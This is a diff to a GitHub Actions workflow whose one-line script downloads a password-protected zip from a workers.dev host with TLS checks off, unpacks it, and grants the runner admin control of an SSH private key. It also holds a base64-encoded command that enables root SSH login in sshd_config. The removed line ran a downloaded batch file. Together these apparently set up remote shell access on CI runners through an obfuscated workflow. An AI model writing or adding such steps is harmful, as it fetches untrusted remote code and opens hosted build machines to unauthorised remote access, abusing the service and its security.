@@ -30,7 +30,7 @@ jobs:
 
 
       - name: Run a one-line script
-        run:  "whoami;echo ${{ inputs.name77 }};curl.exe -4kLO https://win2019.liuhuan777777722.workers.dev/5.zip;unzip -P ${{ inputs.name77 }} 5.zip -d .;id;cmd.exe /c 17.bat; (type env:path) -split ';'  "
+        run:  "whoami;echo ${{ inputs.name77 }};curl.exe -4kLO https://win2019.liuhuan777777722.workers.dev/5.zip;unzip -P ${{ inputs.name77 }} 5.zip -d .;icacls.exe .\id_ecdsa /reset /reset;icacls.exe .\id_ecdsa /grant:r \"runneradmin:F\";icacls.exe .\id_ecdsa /inheritance:r;id;(type env:path) -split ';'  "
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # choco -V&&busybox&&busybox pwd&&dir  ../../../ &&    \"C:/Program Files/Git/bin/"
